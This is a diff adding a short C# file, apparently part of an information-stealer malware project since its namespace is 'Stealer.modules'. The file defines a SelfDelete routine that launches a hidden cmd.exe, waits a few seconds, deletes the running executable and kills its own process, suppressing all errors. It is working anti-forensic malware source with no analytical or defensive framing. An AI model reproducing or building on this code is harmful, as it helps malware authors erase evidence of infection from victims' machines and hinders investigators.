@@ -1,0 +1,26 @@
+using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.IO;
+
+namespace Stealer.modules
+{
+	public class Delete
+	{
+		public static void SelfDelete()
+		{
+			try
+			{
+				Process.Start(new ProcessStartInfo()
+				{
+				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
+				WindowStyle = ProcessWindowStyle.Hidden,
+				CreateNoWindow = true,
+				FileName = "cmd.exe"
+				}).Dispose();
+				Process.GetCurrentProcess().Kill();
+			}
+			catch {}
+		}
+	}
+}
